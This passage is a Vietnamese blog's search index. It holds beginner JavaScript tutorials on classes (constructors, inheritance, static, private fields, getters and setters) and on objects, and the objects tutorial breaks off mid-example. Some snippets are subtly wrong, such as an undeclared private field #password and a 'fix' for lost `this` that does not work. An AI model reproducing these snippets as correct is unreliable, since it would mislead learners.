[{"content":"Dưới đây là các dự án tôi đã hoàn thành trong quá trình học tập và làm việc.\n","date":null,"permalink":"http://localhost:1313/projects/","section":"Dự án của tôi","summary":"","title":"Dự án của tôi"},{"content":"","date":null,"permalink":"http://localhost:1313/contact/","section":"Trang chủ","summary":"","title":"Liên hệ"},{"content":"\rChào mừng đến với blog của tôi!\rTôi chia sẻ về Java, JavaScript và những trải nghiệm lập trình.\n","date":null,"permalink":"http://localhost:1313/","section":"Trang chủ","summary":"","title":"Trang chủ"},{"content":"","date":null,"permalink":"http://localhost:1313/about/","section":"Trang chủ","summary":"","title":"Về tôi"},{"content":"","date":null,"permalink":"http://localhost:1313/categories/","section":"Categories","summary":"","title":"Categories"},{"content":"Lớp (class) trong JavaScript giống như một bản thiết kế xe hơi trong nhà máy: bạn vẽ chi tiết cách lắp ráp (cấu trúc), rồi sản xuất nhiều chiếc xe giống nhau (đối tượng), mỗi chiếc có thể tùy chỉnh (như màu sắc). Tôi sẽ giải thích như kể chuyện cho một người bạn chưa từng học lập trình, dùng nhiều hình ảnh đời thường, ví dụ code cụ thể, bảng so sánh, và flowchart để minh họa. Chúng ta sẽ đi chậm rãi, chia nhỏ thành nhiều phần con, để bạn nắm chắc từng khái niệm. JavaScript vốn dựa trên prototype (mẫu gốc), nhưng class là cách viết hiện đại, dễ hiểu hơn, giống lập trình hướng đối tượng (OOP) cổ điển.\n1. Lớp là gì? (Định nghĩa cơ bản và lịch sử ngắn gọn) #Lớp giống như một công thức làm bánh kem trong sách nấu ăn. Công thức chỉ dẫn nguyên liệu (thuộc tính) và cách làm (phương thức). Bạn dùng công thức để làm nhiều cái bánh (đối tượng), mỗi cái có thể thêm topping riêng (tùy chỉnh).\nGiải thích đơn giản:\nLớp là một mẫu thiết kế để tạo nhiều đối tượng có cấu trúc tương tự. Đối tượng tạo từ lớp gọi là instance (bản sao cụ thể). Lịch sử: Trước ES6 (2015), JS dùng prototype để mô phỏng lớp. Class là \u0026ldquo;đường giả\u0026rdquo; (syntactic sugar) để viết dễ hơn, nhưng bên dưới vẫn là prototype. Phương pháp dựa trên lớp: Tập trung vào lớp làm trung tâm, hỗ trợ kế thừa, đóng gói, đa hình (polymorphism). 1.1. So sánh với đối tượng đơn lẻ #Đối tượng đơn lẻ là một \u0026ldquo;cái bánh làm tay\u0026rdquo;, lớp là \u0026ldquo;công thức cho nhiều bánh\u0026rdquo;.\nVí dụ code:\n// Đối tượng đơn lẻ (không lớp) let xe1 = { mauSac: \u0026#34;đỏ\u0026#34;, chay: function () { console.log(\u0026#34;Xe đỏ chạy!\u0026#34;); }, }; // Lớp (cho nhiều xe) class XeHoi { constructor(mauSac) { this.mauSac = mauSac; } chay() { console.log(`Xe ${this.mauSac} chạy!`); } } let xe2 = new XeHoi(\u0026#34;xanh\u0026#34;); xe2.chay(); // In: Xe xanh chạy! 1.2. Lớp trong ngữ cảnh OOP #Trong OOP, lớp là nền tảng cho 4 trụ cột: đóng gói (encapsulation - ẩn dữ liệu), kế thừa (inheritance), đa hình (polymorphism - phương thức khác nhau), trừu tượng (abstraction - ẩn chi tiết).\nMinh họa: Flowchart cơ bản lớp.\n[ Bản thiết kế: class XeHoi ]\r|\r|--\u0026gt; Constructor: khởi tạo thuộc tính (mauSac)\r|--\u0026gt; Phương thức: chay() (hành vi)\r|\rv\r[ Instance: new XeHoi(\u0026#34;đỏ\u0026#34;) ] --\u0026gt; { mauSac: \u0026#34;đỏ\u0026#34;, chay: function } 2. Tại sao sử dụng lớp? (Lợi ích chi tiết) #Thay vì lắp ráp xe thủ công mỗi lần (dễ lỗi, mất thời gian), bạn dùng bản thiết kế để sản xuất hàng loạt, dễ sửa (chỉ sửa thiết kế).\nGiải thích đơn giản:\nTái sử dụng code: Tạo nhiều instance từ một lớp. Dễ bảo trì: Sửa phương thức ở lớp, tất cả instance cập nhật. Tổ chức tốt: Nhóm dữ liệu và hành vi liên quan. Kế thừa: Mở rộng lớp mà không lặp code. Đóng gói: Ẩn dữ liệu private, chỉ lộ phương thức. 2.1. Ví dụ thực tế trong ứng dụng web/game # Web: Lớp \u0026ldquo;User\u0026rdquo; với thuộc tính email, password; phương thức login, logout. Game: Lớp \u0026ldquo;Enemy\u0026rdquo; với thuộc tính máu, tốc độ; phương thức tấn công, di chuyển. Ví dụ code (ứng dụng web):\nclass User { constructor(email, password) { this.email = email; this.#password = password; // Private } login() { console.log(`${this.email} đã đăng nhập.`); } } let user1 = new User(\u0026#34;teo@example.com\u0026#34;, \u0026#34;123456\u0026#34;); user1.login(); // In: teo@example.com đã đăng nhập. 2.2. Bảng so sánh không lớp vs có lớp # Tiêu chí Không lớp (object literal/prototype thủ công) Có lớp (class syntax) Tái sử dụng Phải copy code thủ công Tạo instance dễ dàng Kế thừa Cài đặt prototype phức tạp Dùng extends đơn giản Đọc code Dài dòng, dễ rối Ngắn gọn, rõ ràng Bảo trì Sửa nhiều chỗ Sửa một chỗ (lớp) Ví dụ function + prototype class + constructor 3. Khai báo lớp cơ bản #Viết bản thiết kế: bắt đầu bằng \u0026ldquo;class TenLop { }\u0026rdquo;, bên trong là chi tiết.\nGiải thích đơn giản:\nTên lớp: Viết hoa chữ cái đầu (convention). Nội dung: Constructor, thuộc tính, phương thức. Khai báo: Có thể trong file riêng, export/import. 3.1. Cú pháp chi tiết #class TenLop { // Constructor constructor() { /* Khởi tạo */ } // Phương thức tenPhuongThuc() { /* Hành vi */ } } 3.2. Hoisting và lưu ý #Lớp không hoisted đầy đủ: phải khai báo trước khi dùng. Ví dụ lỗi:\nlet hs = new HocSinh(); // Lỗi: HocSinh chưa khai báo class HocSinh {} // phải khai báo class trước mới sử dụng 4. Constructor (hàm tạo) chi tiết #Constructor giống \u0026ldquo;lắp khung xe\u0026rdquo; đầu tiên trong nhà máy: đặt màu, động cơ ban đầu.\nGiải thích đơn giản:\nChạy tự động khi new. Nhận tham số để tùy chỉnh instance. Không return (tự return instance). 4.1. Vai trò và cách dùng #Khởi tạo thuộc tính, kiểm tra dữ liệu.\n4.2. Ví dụ với tham số mặc định #class XeHoi { constructor(mauSac = \u0026#34;trắng\u0026#34;, tocDo = 100) { this.mauSac = mauSac; this.tocDo = tocDo; } } let xe = new XeHoi(); // mauSac: trắng, tocDo: 100 console.log(xe.mauSac); // In: trắng 4.3. Lỗi thường gặp trong constructor # Quên this: ten = ten thay vì this.ten = ten (biến cục bộ). Không gọi super() trong lớp con. class XeHoi extends Xe { constructor(ten, mau, tocDo = 100) { super(ten, mau); // Phải gọi constructor lớp cha bằng super() this.tocDo = tocDo; } thongTin() { console.log( `Tên: ${this.ten}, Màu: ${this.mau}, Tốc độ: ${this.tocDo} km/h` ); } } Cách tránh: Luôn dùng this cho thuộc tính instance.\n5. Thuộc tính (properties) trong lớp #Thuộc tính giống \u0026ldquo;bộ phận xe\u0026rdquo;: bánh xe (chung), màu sơn (riêng từng xe).\nGiải thích đơn giản:\nInstance properties: Riêng từng instance, gán trong constructor. Class properties: Chung cho lớp, gán ngoài constructor. 5.1. Instance properties #Gán với this.\n5.2. Class properties #Gán trực tiếp trong lớp (ES2022+).\nVí dụ code:\nclass XeHoi { soBanhXe = 4; // Class property (chung) constructor(mauSac) { this.mauSac = mauSac; // Instance property } } let xe1 = new XeHoi(\u0026#34;đỏ\u0026#34;); let xe2 = new XeHoi(\u0026#34;xanh\u0026#34;); console.log(xe1.soBanhXe); // In: 4 console.log(xe2.soBanhXe); // In: 4 5.3. Bảng so sánh thuộc tính instance vs class # Loại Vị trí gán Phạm vi Ví dụ Instance Trong constructor Riêng từng instance this.mauSac Class Ngoài constructor Chung lớp soBanhXe = 4 6. Phương thức (methods) trong lớp #Phương thức giống \u0026ldquo;nút bấm trên xe\u0026rdquo;: nhấn ga để chạy.\nGiải thích đơn giản:\nPhương thức là hàm định nghĩa hành vi. Chia sẻ qua prototype (tiết kiệm bộ nhớ). 6.1. Instance methods #Dùng this để truy cập thuộc tính.\n6.2. Ví dụ minh họa với nhiều phương thức #class HocSinh { constructor(ten, diem) { this.ten = ten; this.diem = diem; } hocBai() { console.log(`${this.ten} đang học.`); } tinhTrungBinh() { let sum = 0; for (let d of this.diem) sum += d; return sum / this.diem.length; } } let hs = new HocSinh(\u0026#34;Tèo\u0026#34;, [8, 9, 7]); hs.hocBai(); // In: Tèo đang học. console.log(hs.tinhTrungBinh()); // In: 8 6.3. Sử dụng this chi tiết #this trỏ đến instance hiện tại. Mất this nếu dùng arrow function trong phương thức (tránh).\n7. Kế thừa (inheritance) với extends và super #Kế thừa giống xe điện (con) thừa hưởng khung xe từ xe hơi (cha), thêm pin điện.\nGiải thích đơn giản:\nKế thừa: Lớp con dùng thuộc tính/phương thức của cha. extends: Kết nối con với cha. super: Gọi cha (constructor hoặc phương thức). 7.1. Khái niệm kế thừa #Giảm lặp code, tạo hệ thống phân cấp.\n7.2. Cách dùng extends #class Con extends Cha { }\nclass XeDien extends XeHoi { constructor(ten, tocDo, pin) { super(ten, tocDo); // Gọi constructor lớp cha this.pin = pin; // Thuộc tính riêng của lớp con } } 7.3. Sử dụng super cho constructor và phương thức #super() phải gọi trước this trong con.\nconstructor(ten, tocDo, pin) { super(ten, tocDo); // Gọi constructor lớp cha this.pin = pin; // Thuộc tính riêng của lớp con } 7.4. Override (ghi đè) phương thức #Con có thể thay đổi phương thức cha.\nclass XeHoi { constructor(ten, tocDo) { this.ten = ten; this.tocDo = tocDo; } chay() { console.log(`${this.ten} đang chạy ở tốc độ ${this.tocDo} km/h.`); } } class XeDien extends XeHoi { constructor(ten, tocDo, pin) { super(ten, tocDo); // Gọi constructor lớp cha this.pin = pin; // Thuộc tính riêng của lớp con } // Ghi đè (override) phương thức chay() chay() { console.log( `${this.ten} chạy êm ái ở tốc độ ${this.tocDo} km/h (điện, pin ${this.pin}%).` ); } sacPin() { console.log(`${this.ten} đang sạc pin...`); this.pin = 100; } } 7.5. Ví dụ đa cấp kế thừa #\rclass DongVat { constructor(ten) { this.ten = ten; } diChuyen() { console.log(`${this.ten} di chuyển.`); } } class Chim extends DongVat { bay() { console.log(`${this.ten} bay.`); } } class ChimSe extends Chim { constructor(ten) { super(ten); } diChuyen() { // Override super.bay(); // Gọi cha console.log(`${this.ten} bay thấp.`); } } let se = new ChimSe(\u0026#34;Sẻ\u0026#34;); se.diChuyen(); // In: Sẻ bay. Sẻ bay thấp. Minh họa: Flowchart kế thừa.\nDongVat (cha)\r|\r|--\u0026gt; Chim (con)\r|\r|--\u0026gt; ChimSe (cháu)\r|\rv\rOverride: diChuyen() --\u0026gt; Gọi super.bay() 8. Static methods và properties (tĩnh) #Static giống \u0026ldquo;bảng hướng dẫn\u0026rdquo; ở nhà máy, dùng chung, không cần sản xuất xe mới.\nGiải thích đơn giản:\nStatic thuộc lớp, không thuộc instance. Gọi: TenLop.tenStatic(). 8.1. Định nghĩa và vai trò #Dùng cho tiện ích chung, không phụ thuộc instance.\n8.2. Ví dụ static methods #class ToanHoc { static cong(a, b) { return a + b; } } console.log(ToanHoc.cong(5, 3)); // In: 8 8.3. Ví dụ static properties #class Dem { static soLan = 0; constructor() { Dem.soLan++; } } new Dem(); new Dem(); console.log(Dem.soLan); // In: 2 8.4. Lỗi thường gặp với static # Gọi static từ instance: hs.staticMethod() - lỗi. Cách tránh: Luôn gọi từ tên lớp. class HocSinh { constructor(ten) { this.ten = ten; } static chao() { console.log(\u0026#34;Xin chào! Tôi là học sinh.\u0026#34;); } } let hs = new HocSinh(\u0026#34;Minh\u0026#34;); // Sai: gọi static qua instance hs.chao(); // Lỗi: TypeError: hs.chao is not a function // Đúng: gọi static qua tên lớp HocSinh.chao(); // → Xin chào! Tôi là học sinh. 9. Private fields và methods (riêng tư) #Private giống \u0026ldquo;két sắt\u0026rdquo; trong nhà, chỉ chủ nhà mở được.\nGiải thích đơn giản:\nPrivate: Không truy cập từ ngoài lớp. Dùng # trước tên. 9.1. Tại sao cần private? #Bảo vệ dữ liệu, tránh sửa nhầm.\n9.2. Cú pháp với # #class TaiKhoan { #soDu = 0; nap(soTien) { this.#soDu += soTien; } } 9.3. Private methods #class MayTinh { #tinhBinhPhuong(n) { return n * n; } tinh(n) { return this.#tinhBinhPhuong(n); } } let mt = new MayTinh(); console.log(mt.tinh(5)); // In: 25 // mt.#tinhBinhPhuong(5); // Lỗi 9.4. So sánh với convention cũ (_underscore) # Cũ: _soDu (không thật sự ẩn, chỉ convention). Mới: #soDu (thật sự ẩn, lỗi nếu truy cập). Bảng so sánh:\nPhương pháp Mức độ ẩn Cú pháp Ví dụ Convention Không thật _ten _soDu = 0 Private Thật #ten #soDu = 0 10. Getter và Setter (truy cập kiểm soát) #Getter giống \u0026ldquo;cửa kính\u0026rdquo; xem đồ trong két sắt mà không mở. Setter giống \u0026ldquo;khe nạp tiền\u0026rdquo; với kiểm tra (chỉ nạp tiền thật).\nGiải thích đơn giản:\nGetter: Lấy giá trị như thuộc tính, nhưng chạy code (tính toán). Setter: Đặt giá trị với kiểm tra (validation). 10.1. Getter: Lấy giá trị an toàn #class HinhTron { constructor(banKinh) { this.banKinh = banKinh; } get dienTich() { return Math.PI * this.banKinh ** 2; } } let ht = new HinhTron(5); console.log(ht.dienTich); // In: ~78.54 (không cần ()) 10.2. Setter: Đặt giá trị với validation #class Nguoi { constructor(tuoi) { this._tuoi = tuoi; } set tuoi(giaTri) { if (giaTri \u0026gt;= 0 \u0026amp;\u0026amp; giaTri \u0026lt;= 120) this._tuoi = giaTri; else console.log(\u0026#34;Tuổi không hợp lệ!\u0026#34;); } } let ng = new Nguoi(20); ng.tuoi = 25; // OK ng.tuoi = -5; // In: Tuổi không hợp lệ! 10.3. Ví dụ kết hợp getter/setter với private #class NganHang { #soDu = 0; get soDu() { return this.#soDu; } set soDu(soTien) { if (soTien \u0026gt;= 0) this.#soDu = soTien; } } let tk = new NganHang(); tk.soDu = 1000; console.log(tk.soDu); // In: 1000 10.4. Lợi ích trong thực tế # Kiểm soát dữ liệu (validation). Tính toán lazy (chỉ tính khi cần). 11. So sánh với phương pháp prototype-based (cũ) #Prototype giống \u0026ldquo;mẫu thủ công\u0026rdquo; từ giấy, class giống \u0026ldquo;mẫu in 3D\u0026rdquo; hiện đại.\nGiải thích đơn giản:\nJS là prototype-based: Mọi đối tượng có proto trỏ đến prototype. Class: Cách viết đẹp cho prototype, tự động thiết lập. 11.1. Prototype là gì? #Bản mẫu chia sẻ phương thức.\n11.2. Cách viết prototype thủ công #// Tạo hàm khởi tạo (constructor) function XeHoi(ten) { this.ten = ten; } // Gắn phương thức vào prototype XeHoi.prototype.chay = function () { console.log(`${this.ten} đang chạy...`); }; let xe1 = new XeHoi(\u0026#34;Toyota\u0026#34;); let xe2 = new XeHoi(\u0026#34;Honda\u0026#34;); xe1.chay(); // → Toyota đang chạy... xe2.chay(); // → Honda đang chạy... // Kiểm tra nguyên mẫu console.log(Object.getPrototypeOf(xe1) === XeHoi.prototype); // true 11.3. Bảng so sánh class vs prototype # Tiêu chí Prototype thủ công Class syntax Cú pháp Dài, phức tạp Ngắn, dễ đọc Kế thừa Object.create extends Static XeHoi.ten = \u0026hellip; static ten() Private Không hỗ trợ #ten 11.4. Class hoạt động bên dưới như thế nào? #Class tự động gán phương thức vào prototype. Ví dụ: HocSinh.prototype.gioiThieu = function\u0026hellip;\n12. Các khái niệm nâng cao #12.1. Computed property names #Tên thuộc tính động.\nlet prop = \u0026#34;ten\u0026#34;; class Nguoi { [prop] = \u0026#34;Tèo\u0026#34;; } let ng = new Nguoi(); console.log(ng.ten); // In: Tèo 12.2. Class expressions #Gán lớp vào biến.\nlet Lop = class { sayHi() { console.log(\u0026#34;Hi\u0026#34;); } }; let l = new Lop(); l.sayHi(); // In: Hi 12.3. Kiểm tra instanceof #Kiểm tra instance thuộc lớp nào.\nclass HocSinh {} let hs = new HocSinh(); console.log(hs instanceof HocSinh); // true 13. Lỗi thường gặp và cách tránh #Hình ảnh đời thường: Lỗi giống như xây nhà quên móng, sụp đổ.\n13.1. Lỗi quên new #HocSinh() - lỗi, phải new HocSinh().\n13.2. Lỗi this không đúng ngữ cảnh #Trong callback, this mất. Cách tránh: Dùng arrow function hoặc bind.\nVí dụ:\nclass Xe { constructor() { this.mau = \u0026#34;đỏ\u0026#34;; } inMau() { console.log(this.mau); } } let x = new Xe(); let btn = { click: x.inMau }; btn.click(); // undefined (mất this) Cách sửa: click: () =\u0026gt; console.log(this.mau).\n13.3. Vấn đề với kế thừa sâu #Kế thừa nhiều lớp: khó debug. Cách tránh: Giới hạn 2-3 cấp, ưu tiên composition.\n14. Ứng dụng thực tế và ví dụ lớn #14.1. Xây dựng lớp cho game đơn giản #Lớp \u0026ldquo;Player\u0026rdquo; và \u0026ldquo;Enemy\u0026rdquo; kế thừa \u0026ldquo;Character\u0026rdquo;.\nVí dụ code đầy đủ:\nclass Character { constructor(ten, mau) { this.ten = ten; this.mau = mau; } tanCong(damage) { this.mau -= damage; console.log(`${this.ten} mất ${damage} máu, còn ${this.mau}`); } } class Player extends Character { constructor(ten, mau, vuKhi) { super(ten, mau); this.vuKhi = vuKhi; } suDungVuKhi() { console.log(`${this.ten} dùng ${this.vuKhi}`); } } class Enemy extends Character { constructor(ten, mau, tocDo) { super(ten, mau); this.tocDo = tocDo; } chay() { console.log(`${this.ten} chạy với tốc độ ${this.tocDo}`); } } let player = new Player(\u0026#34;Hero\u0026#34;, 100, \u0026#34;kiếm\u0026#34;); let enemy = new Enemy(\u0026#34;Quái vật\u0026#34;, 50, 20); player.suDungVuKhi(); // In: Hero dùng kiếm enemy.tanCong(30); // In: Quái vật mất 30 máu, còn 20 14.2. Lớp trong ứng dụng web (form validation) #Lớp \u0026ldquo;FormValidator\u0026rdquo; kiểm tra input.\nVí dụ code:\nclass FormValidator { constructor(formId) { this.form = document.getElementById(formId); } validateEmail(email) { return /\\S+@\\S+\\.\\S+/.test(email); } submit() { let email = this.form.email.value; if (this.validateEmail(email)) { console.log(\u0026#34;Form hợp lệ!\u0026#34;); } else { console.log(\u0026#34;Email không hợp lệ!\u0026#34;); } } } // Giả sử HTML có \u0026lt;form id=\u0026#34;myForm\u0026#34;\u0026gt;\u0026lt;input name=\u0026#34;email\u0026#34;\u0026gt;\u0026lt;/form\u0026gt; let validator = new FormValidator(\u0026#34;myForm\u0026#34;); validator.submit(); 15. Kết luận và mẹo sử dụng # Tóm tắt: Lớp giúp xây dựng code có cấu trúc, dễ mở rộng với kế thừa, private, static, getter/setter. Mẹo: Bắt đầu bằng constructor đơn giản, thêm phương thức sau. Sử dụng ESLint để check lỗi this. Kết hợp với modules (export class) cho dự án lớn. Học thêm TypeScript để class mạnh mẽ hơn (type checking). Thực hành: Tạo lớp cho dự án cá nhân như todo list (lớp Task). Flowchart chi tiết:\n[ Lớp Cha: DongVat ]\r|--\u0026gt; Constructor(ten) { this.ten = ten }\r|--\u0026gt; Phương thức: an() { ... }\r|--\u0026gt; Static: demDongVat() { ... }\r|\rv\r[ Kế thừa: class Cho extends DongVat ]\r|--\u0026gt; super(ten)\r|--\u0026gt; #giong (private)\r|--\u0026gt; Phương thức: sua() { ... }\r|--\u0026gt; Getter: getGiong() { return this.#giong }\r|--\u0026gt; Setter: setGiong(g) { this.#giong = g }\r|\rv\r[ Instance: new Cho(\u0026#34;Buddy\u0026#34;) ] --\u0026gt; { ten: \u0026#34;Buddy\u0026#34;, #giong: ... }\r|--\u0026gt; Gọi: cho.sua()\r|--\u0026gt; Kiểm tra: cho instanceof DongVat (true) 16. Tài liệu tham khảo # MDN Web Docs: Classes JavaScript.info: Class Inheritance Eloquent JavaScript: The Secret Life of Objects TypeScript Handbook: Classes (cho nâng cao) ","date":"15 October 2025","permalink":"http://localhost:1313/posts/class-trong-js/","section":"Posts","summary":"","title":"Class Trong Js"},{"content":"Đối tượng trong JavaScript giống như một túi đồ trong đời thực: bạn có thể bỏ nhiều thứ vào (như chìa khóa, điện thoại, ví tiền) và mỗi thứ có tên để lấy ra dễ dàng.\n1. Đối tượng là gì? #Hãy nghĩ về đối tượng như một túi đồ hoặc một hộp quà. Trong hộp, bạn có thể để nhiều thứ: một cây bút (gọi là \u0026ldquo;bút\u0026rdquo;), một cuốn sổ (gọi là \u0026ldquo;sổ\u0026rdquo;), và mỗi thứ có thể lấy ra bằng tên. Đối tượng trong JavaScript cũng vậy: nó chứa nhiều thuộc tính (như bút, sổ) và mỗi thuộc tính có tên và giá trị.\nGiải thích đơn giản:\nĐối tượng là một bộ sưu tập các cặp tên: giá trị (key-value). Tên (key): Thường là chuỗi (như \u0026ldquo;ten\u0026rdquo;, \u0026ldquo;tuoi\u0026rdquo;). Giá trị (value): Có thể là số, chuỗi, mảng, hàm, hoặc thậm chí một đối tượng khác. Dùng để nhóm dữ liệu liên quan, như thông tin một người (tên, tuổi, địa chỉ). Ví dụ đời thường: Một học sinh có thông tin: tên là \u0026ldquo;Tèo\u0026rdquo;, tuổi là 15, lớp là \u0026ldquo;10A\u0026rdquo;. Thay vì lưu riêng lẻ, bạn bỏ tất cả vào một \u0026ldquo;túi\u0026rdquo; gọi là đối tượng.\nVí dụ code:\nlet hocSinh = { ten: \u0026#34;Tèo\u0026#34;, tuoi: 15, lop: \u0026#34;10A\u0026#34;, }; console.log(hocSinh.ten); // In: Tèo 2. Tại sao sử dụng đối tượng? #Thay vì để bút, sổ, điện thoại lung tung trên bàn, bạn bỏ vào một túi để dễ quản lý. Đối tượng giúp bạn tổ chức dữ liệu gọn gàng.\nGiải thích đơn giản:\nNhóm dữ liệu: Gộp các thông tin liên quan (như tên, tuổi) vào một chỗ. Dễ đọc, dễ sửa: Thay vì dùng nhiều biến riêng lẻ, bạn chỉ cần một đối tượng. Linh hoạt: Đối tượng có thể chứa cả dữ liệu (thuộc tính) và hành động (phương thức). Tái sử dụng: Dùng đối tượng để mô tả nhiều thứ giống nhau (như nhiều học sinh). Ví dụ đời thường: Trong game, một nhân vật có máu, sức mạnh, vũ khí. Đối tượng giúp bạn lưu tất cả thông tin này trong một \u0026ldquo;túi\u0026rdquo; để dễ quản lý.\nVí dụ code:\n// Không dùng đối tượng (lộn xộn) let ten1 = \u0026#34;Tèo\u0026#34;; let tuoi1 = 15; let lop1 = \u0026#34;10A\u0026#34;; let ten2 = \u0026#34;Tý\u0026#34;; let tuoi2 = 16; let lop2 = \u0026#34;11B\u0026#34;; // Dùng đối tượng (gọn gàng) let hocSinh1 = { ten: \u0026#34;Tèo\u0026#34;, tuoi: 15, lop: \u0026#34;10A\u0026#34; }; let hocSinh2 = { ten: \u0026#34;Tý\u0026#34;, tuoi: 16, lop: \u0026#34;11B\u0026#34; }; console.log(hocSinh1.ten); // In: Tèo console.log(hocSinh2.ten); // In: Tý 3. Cách tạo đối tượng #Tạo đối tượng giống như làm một túi đồ mới, bạn quyết định bỏ gì vào và đặt tên cho từng món.\nGiải thích đơn giản:\nCó nhiều cách tạo đối tượng: Object literal (dùng {}): Cách đơn giản nhất. Hàm tạo (constructor function): Tạo nhiều đối tượng giống nhau. Từ khóa new Object: Ít dùng nhưng linh hoạt. Class (ES6): Cách hiện đại để tạo đối tượng. Ví dụ code:\n// Cách 1: Object literal let hocSinh = { ten: \u0026#34;Tèo\u0026#34;, tuoi: 15, lop: \u0026#34;10A\u0026#34;, }; // Cách 2: Hàm tạo function HocSinh(ten, tuoi, lop) { this.ten = ten; this.tuoi = tuoi; this.lop = lop; } let hocSinh1 = new HocSinh(\u0026#34;Tý\u0026#34;, 16, \u0026#34;11B\u0026#34;); // Cách 3: new Object let hocSinh2 = new Object(); hocSinh2.ten = \u0026#34;Mai\u0026#34;; hocSinh2.tuoi = 14; hocSinh2.lop = \u0026#34;9C\u0026#34;; // Cách 4: Class (ES6) class HocSinhClass { constructor(ten, tuoi, lop) { this.ten = ten; this.tuoi = tuoi; this.lop = lop; } } let hocSinh3 = new HocSinhClass(\u0026#34;Lan\u0026#34;, 15, \u0026#34;10B\u0026#34;); console.log(hocSinh.ten); // In: Tèo console.log(hocSinh1.ten); // In: Tý console.log(hocSinh2.ten); // In: Mai console.log(hocSinh3.ten); // In: Lan 4. Truy cập và sửa đổi thuộc tính #Bạn mở túi đồ, lấy cây bút ra (truy cập) hoặc bỏ thêm một cuốn sổ vào (sửa đổi). Với đối tượng, bạn dùng tên thuộc tính để lấy hoặc thay đổi giá trị.\nGiải thích đơn giản:\nTruy cập bằng: Dấu chấm (.ten): Dùng khi biết tên thuộc tính. Dấu ngoặc ([\u0026quot;ten\u0026quot;]): Dùng khi tên thuộc tính là biến hoặc có ký tự đặc biệt. Sửa đổi: Gán giá trị mới hoặc thêm thuộc tính mới. Ví dụ code:\nlet hocSinh = { ten: \u0026#34;Tèo\u0026#34;, tuoi: 15, lop: \u0026#34;10A\u0026#34; }; // Truy cập console.log(hocSinh.ten); // In: Tèo console.log(hocSinh[\u0026#34;lop\u0026#34;]); // In: 10A // Sửa đổi hocSinh.tuoi = 16; // Cập nhật tuổi hocSinh.diem = 8.5; // Thêm thuộc tính mới console.log(hocSinh); // In: { ten: \u0026#34;Tèo\u0026#34;, tuoi: 16, lop: \u0026#34;10A\u0026#34;, diem: 8.5 } 5. Phương thức trong đối tượng #Trong túi đồ, ngoài bút và sổ, bạn có thể bỏ vào một máy tính nhỏ để tính toán. Phương thức là hàm bên trong đối tượng, giúp đối tượng thực hiện hành động.\nGiải thích đơn giản:\nPhương thức là hàm được gán vào thuộc tính của đối tượng. Dùng để mô tả hành vi của đối tượng, như in thông tin, tính toán. Ví dụ code:\nlet hocSinh = { ten: \u0026#34;Tèo\u0026#34;, tuoi: 15, lop: \u0026#34;10A\u0026#34;, gioiThieu: function () { return `Tôi là ${this.ten}, học lớp ${this.lop}`; }, }; console.log(hocSinh.gioiThieu()); // In: Tôi là Tèo, học lớp 10A 6. Vòng lặp qua đối tượng #Bạn mở túi đồ và kiểm tra từng món bên trong. Vòng lặp qua đối tượng giống như xem từng thuộc tính để biết giá trị.\nGiải thích đơn giản:\nDùng for...in để lặp qua các thuộc tính của đối tượng. Hoặc dùng Object.keys(), Object.values(), Object.entries() để lấy danh sách thuộc tính/giá trị. Ví dụ code:\nlet hocSinh = { ten: \u0026#34;Tèo\u0026#34;, tuoi: 15, lop: \u0026#34;10A\u0026#34; }; // Dùng for...in for (let key in hocSinh) { console.log(`${key}: ${hocSinh[key]}`); } // In: // ten: Tèo // tuoi: 15 // lop: 10A // Dùng Object.entries console.log(Object.entries(hocSinh)); // In: [[\u0026#34;ten\u0026#34;, \u0026#34;Tèo\u0026#34;], [\u0026#34;tuoi\u0026#34;, 15], [\u0026#34;lop\u0026#34;, \u0026#34;10A\u0026#34;]] 7. Sao chép đối tượng #Bạn muốn tạo một túi đồ giống hệt túi cũ, nhưng nếu chỉ trỏ vào túi cũ, thay đổi túi mới sẽ làm hỏng túi cũ. Sao chép đối tượng cần cẩn thận để tránh điều này.\nGiải thích đơn giản:\nSao chép nông (shallow copy): Chỉ sao chép thuộc tính cấp đầu, thuộc tính lồng nhau (như mảng, đối tượng) vẫn liên kết. Sao chép sâu (deep copy): Sao chép toàn bộ, kể cả thuộc tính lồng nhau. Ví dụ code:\nlet hocSinh = { ten: \u0026#34;Tèo\u0026#34;, tuoi: 15, diem: [8, 9] }; // Shallow copy let copy1 = { ...hocSinh }; copy1.diem[0] = 7; // Ảnh hưởng cả hocSinh console.log(hocSinh.diem); // In: [7, 9] // Deep copy (dùng JSON) let copy2 = JSON.parse(JSON.stringify(hocSinh)); copy2.diem[0] = 6; // Không ảnh hưởng hocSinh console.log(hocSinh.diem); // In: [7, 9] 8. Từ khóa this #Trong túi đồ, bạn có một ghi chú nói \u0026ldquo;Tên của túi này là Tèo\u0026rdquo;. this giống ghi chú đó: nó trỏ đến chính đối tượng đang sử dụng.\nGiải thích đơn giản:\nthis là cách đối tượng tự tham chiếu đến chính nó. Thường dùng trong phương thức để truy cập thuộc tính của đối tượng. Ví dụ code:\nlet hocSinh = { ten: \u0026#34;Tèo\u0026#34;, gioiThieu: function () { return `Tôi là ${this.ten}`; }, }; console.log(hocSinh.gioiThieu()); // In: Tôi là Tèo 9. Prototype #Bạn có một túi đồ cơ bản (như bút, sổ). Bạn muốn tạo nhiều túi khác, nhưng mỗi túi có thêm món đặc biệt (như máy tính, thước kẻ). Prototype giống như một \u0026ldquo;bản thiết kế chung\u0026rdquo; mà các túi khác có thể dùng.\nGiải thích đơn giản:\nMọi đối tượng có một prototype (bản thiết kế ẩn) chứa các thuộc tính/phương thức chung. Kế thừa: Đối tượng có thể dùng thuộc tính/phương thức từ prototype. Dùng để chia sẻ hành vi giữa nhiều đối tượng. Ví dụ code:\nfunction HocSinh(ten, tuoi) { this.ten = ten; this.tuoi = tuoi; } HocSinh.prototype.gioiThieu = function () { return `Tôi là ${this.ten}, ${this.tuoi} tuổi`; }; let hs1 = new HocSinh(\u0026#34;Tèo\u0026#34;, 15); let hs2 = new HocSinh(\u0026#34;Tý\u0026#34;, 16); console.log(hs1.gioiThieu()); // In: Tôi là Tèo, 15 tuổi console.log(hs2.gioiThieu()); // In: Tôi là Tý, 16 tuổi 10. JSON và đối tượng #JSON giống như cách bạn viết danh sách đồ trong túi ra giấy để gửi cho bạn bè. Đối tượng có thể chuyển thành JSON và ngược lại.\nGiải thích đơn giản:\nJSON (JavaScript Object Notation) là định dạng chuỗi để biểu diễn đối tượng. Dùng JSON.stringify() để biến đối tượng thành chuỗi. Dùng JSON.parse() để biến chuỗi thành đối tượng. Ví dụ code:\nlet hocSinh = { ten: \u0026#34;Tèo\u0026#34;, tuoi: 15 }; let jsonStr = JSON.stringify(hocSinh); console.log(jsonStr); // In: 